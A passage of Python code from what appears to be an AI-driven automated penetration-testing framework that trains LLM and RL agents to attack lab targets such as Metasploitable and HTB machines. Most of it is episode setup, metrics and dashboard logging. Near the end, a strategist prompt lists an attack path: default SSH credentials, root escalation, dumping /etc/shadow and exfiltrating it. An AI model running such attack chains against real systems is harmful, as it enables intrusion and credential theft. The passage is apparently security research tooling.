                self.trust_engine.register_source("registry")
            except Exception as _e:
                logger.debug(f"[P39.2] TrustWeights reset error: {_e}")

        # Initialize attack context
        target = target or state.get("target_ip", self.config.default_target)
        difficulty = difficulty or self.config.default_difficulty
        platform = platform or state.get("os", self.config.default_platform)
        self.init_attack(target, difficulty, platform)
        
        # ─── PHASE 19: HTB auto-profile loader ──────────────────────
        # Auto-detect HTB targets (10.10.10.x / 10.10.11.x) and load
        # machine profiles from data/htb_extractions/ if available.
        self._htb_profile = None
        try:
            from core.feature_flags import get_feature_flags
            _ff = get_feature_flags()
            if getattr(_ff, "htb_auto_profile", False):
                _is_htb = (target.startswith("10.10.10.") or 
                           target.startswith("10.10.11."))
                if _is_htb:
                    self._target_profile = "htb"
                    import json, pathlib
                    _htb_dir = pathlib.Path("data/htb_extractions")
                    if _htb_dir.exists():
                        # Try to find a profile matching the target
                        _machine_name = getattr(self.config, "machine_name", None)
                        _profile_path = None
                        if _machine_name:
                            _candidate = _htb_dir / f"{_machine_name.lower()}.json"
                            if _candidate.exists():
                                _profile_path = _candidate
                        if not _profile_path:
                            # Search all profiles for matching IP
                            for _pf in sorted(_htb_dir.glob("*.json")):
                                try:
                                    _pd = json.loads(_pf.read_text())
                                    if _pd.get("target_ip") == target:
                                        _profile_path = _pf
                                        break
                                except Exception:
                                    continue
                        if _profile_path:
                            _htb_data = json.loads(_profile_path.read_text())
                            self._htb_profile = _htb_data
                            # Pre-seed discovery board with known info
                            if self.attack_context:
                                for _phase_info in _htb_data.get("phases", []):
                                    for _port in _phase_info.get("ports", []):
                                        self.attack_context.discoveries.setdefault("open_port", set()).add(str(_port))
                                _diff = _htb_data.get("difficulty", difficulty)
                                self.attack_context.difficulty = _diff
                            logger.info(
                                f"[P19] HTB profile loaded: {_profile_path.name} "
                                f"({_htb_data.get('name', 'unknown')})"
                            )
                        else:
                            logger.debug(f"[P19] HTB target {target} — no profile found")
        except Exception as e:
            logger.debug(f"[P19] HTB profile load skipped: {e}")
        
        # ─── PHASE 6.3: Inject campaign memory into attack context ───
        if self.campaign_memory and self.attack_context:
            self.campaign_memory.inject_into_attack_context(self.attack_context)
            prior = self.campaign_memory.get_prior_knowledge()
            if prior.get("known_ports"):
                logger.debug(
                    f"Phase 6.3: Injected {len(prior['known_ports'])} known ports, "
                    f"best_phase_ever={prior.get('best_phase_ever', 'RECON')}"
                )
        
        # Update context from initial state
        self._update_context_from_state(state)
        
        # Update dashboard with initial env state
        self.dashboard.update_env_snapshot({
            "target_ip": target,
            "phase": self.attack_context.current_phase.name.lower(),
            "discovered_ports": list(self.attack_context.discoveries.get("open_port", [])),
            "discovered_services": {s: None for s in self.attack_context.services_found},
        })
        
        # Episode tracking
        episode_reward = 0.0
        step_results: List[List[SmartStepResult]] = []
        _initial_phase = self.attack_context.current_phase.name
        # R55: Register the ACTUAL initial phase (may be EXPLOITATION after
        # campaign memory injection, not always RECON)
        self._phase_start_step = {_initial_phase: 0}
        phase_progression: List[str] = [_initial_phase]
        done = False
        
        # ─── PHASE 10: Executive & Tactical Cortex episode setup ─────
        if self.tactical_cortex:
            try:
                self.tactical_cortex.reset_episode()
            except Exception as e:
                logger.debug(f"Phase 10: TacticalCortex reset failed: {e}")
        
        if self.executive_cortex:
            try:
                self.executive_cortex.reset_episode()
                # Detect target type for plan creation
                _target_type = "unknown"
                _target_ip = target or self.config.default_target
                if _target_ip == "172.28.0.10":
                    _target_type = "ms2"
                elif _target_ip == "172.28.0.11":
                    _target_type = "ms3"
                elif self.target_profiler:
                    try:
                        _tp = self.target_profiler.classify_target(_target_ip, state)
                        _target_type = getattr(_tp, "target_type", "unknown")
                    except Exception:
                        pass
                self._episode_plan = self.executive_cortex.create_plan(
                    initial_state=state,
                    target_ip=_target_ip,
                    target_type=_target_type,
                    max_steps=max_steps,
                )
                logger.debug(
                    f"Phase 10: AttackPlan created ({len(self._episode_plan.objectives)} "
                    f"objectives, type={_target_type})"
                )
            except Exception as e:
                logger.debug(f"Phase 10: ExecutiveCortex plan creation failed: {e}")
                self._episode_plan = None
        
        # ─── PHASE 11.0: Reset per-episode controllers ───────────────
        if self.budget_controller:
            self.budget_controller.reset_episode(max_steps=max_steps)
        if self.parser_broker:
            self.parser_broker.reset_episode()
        if self.learning_exporter:
            self.learning_exporter.start_episode(episode_id=episode_number)
        
        # P34-EXT: Reset learning metrics for new episode
        if self.learning_metrics:
            self.learning_metrics.reset_episode(episode_id=episode_number)
        
        # P36.1: Reset fast-learn metrics for new episode
        if self.fast_learn_metrics:
            self.fast_learn_metrics.reset_episode(episode=episode_number)
        
        total_mentor_calls = 0
        
        for step in range(max_steps):
            self.current_step = step
            
            # R55: Track phase BEFORE _run_step() to detect transitions.
            # Previously, current_phase was read AFTER _run_step(), causing a
            # race condition where phase transitions during _run_step() made
            # both current_phase and new_phase identical — so _phase_start_step
            # was never updated, and the ≥12 PRIV_ESC forced cascade could
            # never fire (step - step = 0 always).
            _pre_step_phase = self.attack_context.current_phase.name
            
            # ── Phase 23: SMART RECON ENFORCEMENT — discovery-driven, not step-counted ──
            # In cybersecurity, recon is ALWAYS the first step. Instead of a hardcoded
            # step count, we check the discovery board: if we haven't found ports/services,
            # we stay in RECON regardless of step number. This is LLM-friendly — the GPT
            # parser drives discoveries, and the discovery board gates advancement.
            if self.attack_context:
                _recon_ports = len(self.discovery_board.get("ports", set()))
                _recon_services = len(self.discovery_board.get("services", set()))
                _recon_ready = _recon_ports >= 2 and _recon_services >= 1
                if not _recon_ready and self.attack_context.current_phase != AttackPhase.RECON:
                    logger.debug(
                        f"[Phase23] Step {step}: Enforcing RECON (was {self.attack_context.current_phase.name}) "
                        f"— need ≥2 ports (have {_recon_ports}) and ≥1 service (have {_recon_services})"
                    )
                    self.attack_context.current_phase = AttackPhase.RECON
                    if self.attack_context.state_flags:
                        self.attack_context.state_flags["_highest_reached_phase"] = AttackPhase.RECON
                    _pre_step_phase = "RECON"
            
            # Run all agents
            step_agent_results, env_reward, new_state, done = self._run_step(
                episode_id=episode_id,
                step=step,
                state=state,
            )
            
            step_results.append(step_agent_results)
            episode_reward += env_reward
            
            # ── Phase 6.5: Build unified dashboard display ──────────────
            from core.observability.live_dashboard import AgentStepInfo
            
            dashboard_results = []   # Legacy format for record_step
            agent_infos = []         # New AgentStepInfo for print_step
            skipped_agents = {}      # Agents that didn't fire this step
            
            # Phase 11.0: Collect step traces and teaching points
            _step_traces = []
            _step_teaching_points: list = []
            _step_parse_explanations: list = []
            _step_budget_snapshot = None
            _step_phase_state = None
            
            # Phase 11.0: Budget controller tick
            if self.budget_controller:
                self.budget_controller.step_tick(step)
                _step_budget_snapshot = self.budget_controller.get_snapshot()
            
            # Phase 11.0: Phase ladder state
            _current_phase_name = self.attack_context.current_phase.name if self.attack_context else "RECON"
            
            # Determine which agents were active vs skipped
            active_agent_names = {r.agent_name for r in step_agent_results}
            all_agent_names = list(self.coaches.keys())
            
            # P36: Use structured skip reasons from _should_activate
            for aname in all_agent_names:
                if aname not in active_agent_names:
                    if aname in getattr(self, '_p36_skip_reasons', {}):
                        skipped_agents[aname] = self._p36_skip_reasons[aname]
                    else:
                        skipped_agents[aname] = "skipped"
            
            for result in step_agent_results:
                total_mentor_calls += 1 if result.decision.mentor_call else 0
                tokens_for_step = getattr(result.decision, 'tokens_used', 0)
                
                # Parse discoveries from this agent's output
                cmd_output = result.decision.command_output or ""
                agent_disc = {}
                _agent_parse_explanations = []
                _agent_parse_latency = 0.0
                _agent_parse_stage = 0
                if cmd_output:
                    try:
                        # Phase 11.0: Use ParserBroker v2.0 if available
                        if self.parser_broker:
                            _events, _explanations, _latency, _stage = (
                                self.parser_broker.parse_with_explanations(
                                    command=result.decision.command or "",
                                    output=cmd_output,
                                    agent_name=result.agent_name,
                                )
                            )
                            if _events:
                                from core.execution.discovery_event import DiscoveryEvent
                                agent_disc = DiscoveryEvent.to_flat_discoveries(_events)
                            _agent_parse_explanations = _explanations
                            _agent_parse_latency = _latency
                            _agent_parse_stage = _stage
                            
                            # Phase 11.3: Feed interpretation lessons back to agent coach
                            # The LLM interpreter produces InterpretationLesson objects
                            # that teach agents HOW to read command output.
                            try:
                                _lesson = self.parser_broker.get_last_lesson()
                                if _lesson is not None:
                                    _coach = self.coaches.get(result.agent_name)
                                    if _coach is not None:
                                        # Feed compact lesson context
                                        _lctx = _lesson.to_learning_context()
                                        if _lctx:
                                            _coach.record_interpretation_lesson(_lctx)
                                        # Also inject cross-episode patterns
                                        _pats = self.parser_broker.get_learned_patterns(
                                            result.agent_name
                                        )
                                        if _pats:
                                            _coach.inject_output_patterns(_pats)
                            except Exception:
                                pass
                        else:
                            # Fallback to legacy SmartOutputParser
                            parsed = self._parse_output_for_discoveries(
                                cmd_output, command=result.decision.command or "",
                                episode_id=self._current_episode_id,
                                step_idx=step, agent_id=result.agent_name,
                            )
                            if parsed:
                                agent_disc = parsed
                    except Exception:
                        pass
                
                # Phase 11.0: Build UnifiedStepTrace
                _trace = None
                try:
                    from core.telemetry.unified_trace import UnifiedStepTrace, BudgetSnapshot, PhaseState
                    _trace = UnifiedStepTrace.from_decision_result(
                        decision=result.decision,
                        episode_id=self._current_episode_id,
                        step=step,
                    )
                    _trace.agent_name = result.agent_name
                    _trace.raw_output = cmd_output[:2000] if cmd_output else ""
                    _trace.execution_mode = "live" if self._is_live_mode else "simulated"
                    _trace.discoveries = agent_disc
                    _trace.discovery_count = sum(
                        len(v) if isinstance(v, (list, set)) else (1 if v else 0)
                        for v in agent_disc.values()
                    ) if agent_disc else 0
                    _trace.parse_explanations = _agent_parse_explanations
                    _trace.parse_latency_ms = _agent_parse_latency
                    _trace.parse_stage_reached = _agent_parse_stage
                    _trace.reward_total = env_reward
                    
                    # Budget snapshot
                    if _step_budget_snapshot:
                        _trace.budget_snapshot = BudgetSnapshot(**_step_budget_snapshot)
                    
                    # Phase state
                    _coach = self.coaches.get(result.agent_name)
                    if _coach and hasattr(_coach, '_phase_step_counts'):
                        _steps_in = _coach._phase_step_counts.get(_current_phase_name, 0)
                        _min_req = _coach.PHASE_LADDER_MIN_STEPS.get(_current_phase_name, 1)
                        _trace.phase_state = PhaseState(
                            current_phase=_current_phase_name,
                            steps_in_phase=_steps_in,
                            min_steps_required=_min_req,
                            can_advance=_steps_in >= _min_req,
                        )
                        _step_phase_state = _trace.phase_state.to_dict()
                    
                    _step_traces.append(_trace)
                    
                    # Collect parse explanations for dashboard
                    for _pe in _agent_parse_explanations:
                        _step_parse_explanations.append(_pe.to_dict() if hasattr(_pe, 'to_dict') else _pe)
                except Exception:
                    pass
                
                # Phase 11.0: Record to learning signal exporter
                if self.learning_exporter and _trace:
                    try:
                        self.learning_exporter.record_step(_trace)
                    except Exception:
                        pass
                
                # Phase 11.0: Budget recording now lives in SmartCoach.decide()
                # (after anti-repeat guard) to avoid double-count.
                
                dashboard_results.append({
                    "agent": result.agent_name,
                    "agent_name": result.agent_name,
                    "chosen_action": result.decision.command,
                    "proposed_action": result.decision.command,
                    "mentor_call": result.decision.mentor_call,
                    "confidence": result.decision.confidence,
                    "mentor_reasoning": result.decision.mentor_reasoning or "",
                    "tokens_used": tokens_for_step,
                    "command_output": cmd_output,
                    "source": result.decision.source if hasattr(result.decision, 'source') else "unknown",
                })
                
                agent_infos.append(AgentStepInfo(
                    agent_name=result.agent_name,
                    command=result.decision.command,
                    command_output=cmd_output,
                    mentor_reasoning=result.decision.mentor_reasoning or "",
                    source=result.decision.source if hasattr(result.decision, 'source') else "unknown",
                    confidence=result.decision.confidence,
                    reward=env_reward,
                    mentor_call=result.decision.mentor_call,
                    tokens_used=tokens_for_step,
                    discoveries=agent_disc,
                ))
            
            # Build reward breakdown dict
            reward_breakdown_dict = None
            if step_agent_results:
                if step_agent_results[0].reward_breakdown:
                    rb = step_agent_results[0].reward_breakdown
                    reward_breakdown_dict = {
                        "base": rb.base_reward,
                        "novelty_bonus": rb.novelty_bonus,
                        "redundancy_penalty": rb.redundancy_penalty,
                        "phase_bonus": rb.phase_advance_bonus,
                        "total": rb.total,
                    }
            
            # Record stats
            self.dashboard.record_step(
                step=step,
                phase=self.attack_context.current_phase.name.lower(),
                agent_results=dashboard_results,
                global_reward=env_reward,
                done=done,
                reward_breakdown=reward_breakdown_dict,
            )
            
            # Print unified step display (Phase 6.5)
            disc_board = getattr(self, 'discovery_board', None)
            if disc_board:
                # Convert sets to lists for display
                disc_board_display = {k: list(v) if isinstance(v, set) else v for k, v in disc_board.items()}
            else:
                disc_board_display = None
            
            # Phase 10.3 + 11.0: Collect parser stats + reasoning events
            _parser_stats = None
            if self.parser_broker:
                _parser_stats = self.parser_broker.get_stats()
            elif hasattr(self, 'smart_parser') and self.smart_parser:
                _raw = self.smart_parser.get_stats()
                # Map SmartOutputParser keys → dashboard-expected keys
                _parser_stats = {
                    "total_calls": _raw.get("total_calls", 0),
                    "stage1_hits": _raw.get("regex_hits", 0),
                    "stage2_hits": _raw.get("llm_calls", 0),
                    "stage3_hits": 0,  # Venice not used in SOP path
                    "stage4_hits": 0,  # GPT finaliser not used in SOP path
                    "empty_outputs": _raw.get("empty_outputs", 0),
                }
            
            _reasoning_events = []
            for _coach_name, _coach in self.coaches.items():
                if hasattr(_coach, 'get_step_reasoning'):
                    _reasoning_events.extend(_coach.get_step_reasoning())
                # Phase 11.0: Collect teaching points from phase ladder
                if hasattr(_coach, '_step_reasoning_log'):
                    for _ev in _coach._step_reasoning_log:
                        if _ev.get("event") == "phase_ladder":
                            _step_teaching_points.append(_ev.get("detail", ""))
            
            # Phase 23: Collect GPT activity snapshot for dashboard visibility
            _gpt_activity = None
            if hasattr(self.gpt_manager, 'get_gpt_activity_snapshot'):
                _gpt_activity = self.gpt_manager.get_gpt_activity_snapshot()

            # ── P34-EXT: Record learning metrics + build snapshot for dashboard ──
            _learning_snapshot = None
            if self.learning_metrics:
                try:
                    _lm_source = ""
                    _lm_template = ""
                    _lm_cmd = ""
                    _lm_ar = False
                    if step_agent_results:
                        _lm_dec = step_agent_results[0].decision
                        if _lm_dec:
                            _lm_source = getattr(_lm_dec, 'source', '') or ''
                            _lm_template = getattr(_lm_dec, 'template_name', '') or ''
                            _lm_cmd = getattr(_lm_dec, 'command', '') or ''
                            _lm_ar = _lm_source == "anti_repeat"

                    _lm_tier = ""
                    _lm_tokens = 0
                    _lm_cost = 0.0
                    if _gpt_activity:
                        _lm_tokens = _gpt_activity.get("step_tokens", 0)
                        _lm_cost = _gpt_activity.get("step_cost_usd", 0.0)
                        _sc = _gpt_activity.get("step_calls", [])
                        if _sc:
                            _mdl = _sc[0].get("model", "")
                            if "codex" in _mdl:
                                _lm_tier = "codex"
                            elif "mini" in _mdl:
                                _lm_tier = "mini"
                            elif "nano" in _mdl:
                                _lm_tier = "nano"
                            else:
                                _lm_tier = "mini"

                    _lm_snap = self.learning_metrics.record_step(
                        step=step,
                        discovery_board=self.discovery_board,
                        decision_source=_lm_source,
                        template_name=_lm_template,
                        command=_lm_cmd,
                        phase=self.attack_context.current_phase.name,
                        anti_repeat_blocked=_lm_ar,
                        model_tier=_lm_tier,
                        tokens_used=_lm_tokens,
                        cost_usd=_lm_cost,
                    )

                    # Build dashboard snapshot every N steps
                    if self.learning_metrics.should_print_dashboard(step):
                        _wm = self.learning_metrics.get_window_metrics()
                        _learning_snapshot = {
                            **_lm_snap.to_dict(),
                            "anti_repeat_total": self.learning_metrics.anti_repeat_total,
                            "total_commands": self.learning_metrics.total_commands,
                            "unique_templates": self.learning_metrics.unique_template_count,
                            "phase_changes": self.learning_metrics.phase_changes,
                            "milestones": self.learning_metrics.milestones.to_dict(),
                            "model_mix": self.learning_metrics.model_mix.to_dict(),
                            "window": _wm.to_dict(),
                        }
                except Exception as _lm_err:
                    logger.debug(f"P34-EXT: LearningMetrics error: {_lm_err}")

            # ── P36.1: FastLearnMetrics — value/advantage/distillation/MC ──
            if self.fast_learn_metrics:
                try:
                    # Extract PPO value prediction from the active coach
                    _fl_value_pred = 0.0
                    _fl_hallucinations = 0
                    _fl_contradictions = 0
                    _fl_mc_success = None
                    _fl_distill_score = 0.0
                    _fl_distill_reason = ""
                    _fl_template = ""
                    _fl_phase_str = self.attack_context.current_phase.name if self.attack_context else ""

                    if step_agent_results:
                        _fl_dec = step_agent_results[0].decision
                        if _fl_dec:
                            _fl_template = getattr(_fl_dec, 'template_name', '') or ''
                            # Check for evidence gate rejections → hallucination indicator
                            _eg_result = getattr(_fl_dec, 'evidence_gate_result', '')
                            if _eg_result in ('log_reject', 'enforce_reject'):
                                _fl_hallucinations += 1
                            # Check micro-chain source
                            _src = getattr(_fl_dec, 'source', '')
                            if _src == 'micro_chain':
                                _fl_mc_success = True
                            elif _src == 'fallback' and 'micro_chain' in (getattr(_fl_dec, 'reasoning', '') or ''):
                                _fl_mc_success = False

                        # Get PPO value prediction from the coach
                        _fl_agent = step_agent_results[0].agent_name
                        _fl_coach = self.coaches.get(_fl_agent)
                        if _fl_coach and hasattr(_fl_coach, '_ppo_pending') and _fl_coach._ppo_pending:
                            _fl_value_pred = _fl_coach._ppo_pending.get('value', 0.0)

                    # Record model calls from GPT activity
                    if _gpt_activity:
                        _sc = _gpt_activity.get("step_calls", [])
                        for _call in _sc:
                            _mdl = _call.get("model", "")
                            if "codex" in _mdl:
                                self.fast_learn_metrics.record_model_call("codex")
                            elif "mini" in _mdl:
                                self.fast_learn_metrics.record_model_call("mini")
                            elif "nano" in _mdl:
                                self.fast_learn_metrics.record_model_call("nano")

                    # Step cost
                    _fl_cost = _gpt_activity.get("step_cost_usd", 0.0) if _gpt_activity else 0.0
                    _fl_pressure = _gpt_activity.get("budget_pressure", 0.0) if _gpt_activity else 0.0

                    _fl_snap = self.fast_learn_metrics.record_step(
                        step=step,
                        phase=_fl_phase_str,
                        template=_fl_template,
                        value_pred=_fl_value_pred,
                        reward=global_reward,
                        step_cost=_fl_cost,
                        hallucination_flags=_fl_hallucinations,
                        contradictions=_fl_contradictions,
                        mc_success=_fl_mc_success,
                        distillation_score=_fl_distill_score,
                        distillation_reason=_fl_distill_reason,
                        budget_pressure=_fl_pressure,
                    )

                    # Add fast-learn dashboard line to learning_snapshot
                    if _learning_snapshot is None:
                        _learning_snapshot = {}
                    _learning_snapshot["fast_learn_line"] = self.fast_learn_metrics.get_dashboard_line()

                    # Budget governor evaluation every 40 steps
                    if step > 0 and step % 40 == 0:
                        _gov = self.fast_learn_metrics.evaluate_governor(step)
                        # Propagate learn_boost_factor to BudgetManagerV2 if available
                        if hasattr(self, 'gpt_manager') and hasattr(self.gpt_manager, 'budget_manager'):
                            _bm = getattr(self.gpt_manager, 'budget_manager', None)
                            if _bm and hasattr(_bm, 'set_learn_boost_factor'):
                                _bm.set_learn_boost_factor(_gov.learn_boost_factor)

                except Exception as _fl_err:
                    logger.debug(f"P36.1: FastLearnMetrics error: {_fl_err}")

            try:
                # P37: Collect LLM↔RL bridge snapshot from active coaches
                _llm_bridge_snap = None
                for _bn, _bc in self.coaches.items():
                    _bridge = getattr(_bc, '_p37_llm_bridge', None)
                    if _bridge is not None and _bridge.enabled:
                        _llm_bridge_snap = _bridge.get_influence_snapshot()
                        break  # Use first active bridge (typically RedAgent)

                self.dashboard.print_step(
                    step=step,
                    phase=self.attack_context.current_phase.name.lower(),
                    mode_tag="LIVE" if self._is_live_mode else "SIM",
                    agent_infos=agent_infos,
                    skipped_agents=skipped_agents,
                    global_reward=env_reward,
                    done=done,
                    reward_breakdown=reward_breakdown_dict,
                    discovery_board=disc_board_display,
                    parser_stats=_parser_stats,
                    reasoning_events=_reasoning_events if _reasoning_events else None,
                    teaching_points=_step_teaching_points if _step_teaching_points else None,
                    budget_snapshot=_step_budget_snapshot,
                    parse_explanations=_step_parse_explanations if _step_parse_explanations else None,
                    phase_state=_step_phase_state,
                    gpt_activity=_gpt_activity,
                    learning_snapshot=_learning_snapshot,
                    llm_bridge_snapshot=_llm_bridge_snap,
                )
            except Exception as _ps_err:
                import sys
                print(
                    f"\n[DASHBOARD-ERR] print_step crashed: {type(_ps_err).__name__}: {_ps_err}\n"
                    f"  step={step}, agents={len(agent_infos)}, skipped={len(skipped_agents)}",
                    flush=True, file=sys.stderr,
                )
                import traceback
                traceback.print_exc(file=sys.stderr)
            
            # P35: Render coherence panel after step display
            if self._last_coherence_result is not None:
                try:
                    self.dashboard.print_coherence_panel(
                        coherence_result=self._last_coherence_result,
                        step=step,
                    )
                except Exception as _coh_err:
                    import sys
                    print(
                        f"[P35-PANEL-ERR] {type(_coh_err).__name__}: {_coh_err}",
                        file=sys.stderr, flush=True,
                    )
            else:
                import sys
                print(
                    f"[P35-PANEL] step={step} _last_coherence_result is None "
                    f"(chain={self.coherence_chain is not None})",
                    file=sys.stderr, flush=True,
                )
            
            # P35: Write live trace line
            if self.live_trace_writer is not None:
                try:
                    _trace_actions = [
                        {"agent": a.agent_name, "command": a.command[:120],
                         "source": getattr(a.decision, 'source', '') if a.decision else ''}
                        for a in step_agent_results
                    ] if step_agent_results else []
                    self.live_trace_writer.write_step(
                        step=step,
                        canonical_state=getattr(self, '_last_canonical', None),
                        coherence_result=self._last_coherence_result,
                        agent_actions=_trace_actions,
                        reward=env_reward,
                    )
                except Exception as _tr_err:
                    logger.debug(f"P35: Trace write error: {_tr_err}")
            
            # ─── R66: Coherence + RND + JSONL + HUD instrumentation ──────
            _r66_phase = self.attack_context.current_phase.name
            _r66_macro_name = ""
            _r66_macro_conf = 0.0
            _r66_intrinsic = 0.0
            _r66_source = "unknown"
            _r66_ar_fired = False
            _r66_codex_fired = False
            _r66_tmpl = ""
            _r66_had_discovery = False
            
            if step_agent_results:
                _r66_src = step_agent_results[0]
                _r66_source = getattr(_r66_src.decision, 'source', 'unknown') if _r66_src.decision else 'unknown'
                _r66_ar_fired = _r66_source == "anti_repeat"
                _r66_codex_fired = _r66_source in ("codex_meta", "codex_tactical", "codex_strategic")
                _r66_tmpl = getattr(_r66_src.decision, 'template_name', '') or ''
                # Get macro from coach
                _red_coach = self.coaches.get("RedAgent")
                if _red_coach and hasattr(_red_coach, '_active_macro'):
                    _m = getattr(_red_coach, '_active_macro', None)
                    _r66_macro_name = _m.name if _m else ""
                    _r66_macro_conf = getattr(_red_coach, '_ddqn_confidence', 0.0)
            
            # RND intrinsic reward
            if self.rnd_curiosity and state:
                try:
                    import torch as _t66
                    from core.models.state_encoder import encode_state as _enc66
                    _st66 = _enc66(state, _t66.device("cpu"), current_step=step, max_steps=max_steps)
                    _r66_intrinsic = self.rnd_curiosity.compute_intrinsic_reward(_st66, phase=_r66_phase)
                    self.rnd_curiosity.update(_st66)
                    episode_reward += _r66_intrinsic  # Add intrinsic to total
                except Exception:
                    pass
            
            # Check for discoveries this step
            if disc_board_display:
                _cur_disc_count = sum(
                    len(v) for k, v in disc_board_display.items()
                    if isinstance(v, (list, set)) and k not in ("phase", "flags_set")
                )
                _prev_disc_count = getattr(self, '_r66_prev_disc_count', 0)
                _r66_had_discovery = _cur_disc_count > _prev_disc_count
                self._r66_prev_disc_count = _cur_disc_count
            
            # Coherence tracking
            _phase_ord = {"RECON": 0, "ENUMERATION": 1, "EXPLOITATION": 2,
                          "PRIVILEGE_ESCALATION": 3, "LATERAL_MOVEMENT": 4,
                          "POST_EXPLOITATION": 5, "EXFILTRATION": 6, "CLOSEOUT": 7}.get(_r66_phase, 0)
            if self.coherence_tracker:
                self.coherence_tracker.record_step(
                    source=_r66_source,
                    had_discovery=_r66_had_discovery,
                    phase_ord=_phase_ord,
                    success=not _r66_ar_fired,
                    macro_conf=_r66_macro_conf,
                )
            _r66_coherence = self.coherence_tracker.coherence if self.coherence_tracker else 0.5
            
            # R66: Inject coherence + macro_conf into all coaches for entropy gating + codex enrichment
            for _cn, _coach in self.coaches.items():
                if hasattr(_coach, '_r66_coherence'):
                    _coach._r66_coherence = _r66_coherence
                    _coach._r66_macro_conf = _r66_macro_conf

            # ─── R67: Reward velocity tracking ───────────────────────
            _r67_velocity = 0.0
            _r67_stalling = False
            if hasattr(self, 'reward_velocity') and self.reward_velocity is not None:
                self.reward_velocity.record(step_reward=env_reward, phase_ord=_phase_ord)
                _r67_velocity = self.reward_velocity.velocity
                _r67_stalling = self.reward_velocity.is_stalling
                # Inject stall signal into coaches for adaptive codex budget
                for _cn, _coach in self.coaches.items():
                    if hasattr(_coach, '_r67_velocity'):
                        _coach._r67_velocity = _r67_velocity
                        _coach._r67_stalling = _r67_stalling
            
            # JSONL + HUD
            _r66_unique = len(set(
                r.decision.command for sr_list in step_results for r in sr_list
                if r.decision and r.decision.command
            ))
            if self.run_logger:
                from core.logging.jsonl_logger import StepRecord
                self.run_logger.log_step(StepRecord(
                    ep=episode_number, step=step, phase=_r66_phase,
                    source=_r66_source, macro=_r66_macro_name,
                    macro_conf=_r66_macro_conf, coherence=_r66_coherence,
                    reward_delta=env_reward, intrinsic_reward=_r66_intrinsic,
                    anti_repeat_fired=_r66_ar_fired, codex_fired=_r66_codex_fired,
                    template_name=_r66_tmpl, agent=step_agent_results[0].agent_name if step_agent_results else "",
                ))
                # Only print compact HUD line when dashboard is NOT live
                # (live mode has full Rich panels — HUD is redundant)
                if self.config.dashboard_mode != "live":
                    _r66_tag = getattr(self, '_r66_env_tag', 'sim')
                    self.run_logger.print_hud_line(
                        run_tag=f"{_r66_tag}",
                        ep=episode_number, step=step, phase=_r66_phase,
                        macro=_r66_macro_name, macro_conf=_r66_macro_conf,
                        coherence=_r66_coherence, source=_r66_source,
                        reward_delta=env_reward + _r66_intrinsic,
                        intrinsic=_r66_intrinsic, anti_repeat=_r66_ar_fired,
                        codex=_r66_codex_fired, unique_cmds=_r66_unique,
                    )
            
            # Phase 6.2: Emit StepEvent to EventBus
            if hasattr(self, 'event_bus'):
                self._emit_step_event(
                    episode_id=episode_id,
                    episode_num=episode_number,
                    step_num=step,
                    agent_results=step_agent_results,
                    env_reward=env_reward,
                    episode_reward=episode_reward,
                    total_mentor_calls=total_mentor_calls,
                    target=target,
                )
                # Advance MentorController step
                if hasattr(self, 'mentor_controller') and self.mentor_controller:
                    self.mentor_controller.step()
            
            # Update attack context from new state
            if new_state:
                self._update_context_from_state(new_state)
                state = new_state
                
                # Update dashboard env snapshot
                self.dashboard.update_env_snapshot({
                    "target_ip": self.attack_context.target,
                    "phase": self.attack_context.current_phase.name.lower(),
                    "discovered_ports": list(self.attack_context.discoveries.get("open_port", [])),
                    "discovered_services": {s: None for s in self.attack_context.services_found},
                    "root_achieved": self.attack_context.state_flags.get("root_shell_obtained", False),
                    "credentials": ["found"] if self.attack_context.state_flags.get("credentials_known") else [],
                })
            
            # ─── Phase 8.2: Orion gpt-5.2-codex strategic reviews (2 per episode) ────
            # Review 1 at step 10: Initial assessment and kill chain selection
            # Review 2 at step 25: Mid-game strategic adjustment based on progress
            # Dynamic token allocation: more tokens for deeper analysis on LIVE targets
            _orion_review_steps = [10, 25]
            _orion_review_count = getattr(self, '_orion_review_count', 0)
            if step in _orion_review_steps and _orion_review_count < 2:
                self._orion_review_count = _orion_review_count + 1
                try:
                    _disc = self.discovery_board
                    _ports_list = sorted(list(_disc.get('ports', set())))[:15]
                    _svc_list = list(_disc.get('services', set()))[:8]
                    _creds_list = list(_disc.get('credentials', set()))[:5]
                    _shells_list = list(_disc.get('shells', set()))[:3]
                    _phase = self.attack_context.current_phase.name
                    _flags = self.attack_context.state_flags
                    
                    # Dynamic token allocation — first review shorter, second deeper
                    _max_tokens = 350 if step == 10 else 500
                    
                    # Build team communication context — what each agent discovered
                    _team_context = ""
                    for _coach_key, _coach in self.coaches.items():
                        _recent = _coach._episode_chain[-3:] if _coach._episode_chain else []
                        _fails = _coach._reasoning_failures[-2:] if _coach._reasoning_failures else []
                        if _recent or _fails:
                            _team_context += f"\n  {_coach.agent_name}: recent=[{', '.join(_recent)}]"
                            if _fails:
                                _team_context += f" failures=[{', '.join(_fails)}]"
                    
                    # Build best chain context from cross-episode memory
                    _chain_context = ""
                    for _coach_key, _coach in self.coaches.items():
                        if _coach._best_chain:
                            _bc = _coach._best_chain
                            _chain_context += (
                                f"\n  {_coach.agent_name} best chain: "
                                f"{' → '.join(_bc['commands'][:6])} "
                                f"(reward={_bc['total_reward']:.0f}, phase={_bc['highest_phase']})"
                            )
                    
                    _review_type = "INITIAL ASSESSMENT" if step == 10 else "MID-GAME ADJUSTMENT"
                    _orion_prompt = (
                        f"You are Orion, the strategic mastermind of a 5-agent pentesting team "
                        f"(Red=attacker, Scout=recon, Shadow=stealth, Blue=defense, Orion=you).\n"
                        f"This is a {_review_type} for episode progress.\n\n"
                        f"TARGET: {target} (LIVE {'Metasploitable 3' if '0.11' in str(target) else 'Metasploitable 2'} Linux)\n"
                        f"Step: {step}/{self.config.max_steps_per_episode} | Phase: {_phase}\n"
                        f"Flags: shell={'YES' if _flags.get('shell_obtained') else 'NO'}, "
                        f"root={'YES' if _flags.get('root_shell_obtained') else 'NO'}, "
                        f"creds={'YES' if _flags.get('credentials_known') else 'NO'}, "
                        f"data_exfil={'YES' if _flags.get('data_exfiltrated') else 'NO'}\n\n"
                        f"DISCOVERIES:\n"
                        f"  Ports: {_ports_list}\n  Services: {_svc_list}\n"
                        f"  Credentials: {_creds_list}\n  Shells: {_shells_list}\n"
                        f"Phase progression: {' → '.join(phase_progression)}\n"
                        f"\nTEAM STATUS:{_team_context or ' (no data yet)'}\n"
                        f"\nBEST KNOWN CHAINS:{_chain_context or ' (none yet)'}\n"
                        f"\nKNOWN EXPLOIT PATHS FOR THIS TARGET:\n"
                    )
                    if '0.11' in str(target):
                        _orion_prompt += (
                            f"MS3 LINUX:\n"
                            f"- SSH msfadmin:msfadmin → sudo su → root → dump /etc/shadow → exfil\n"
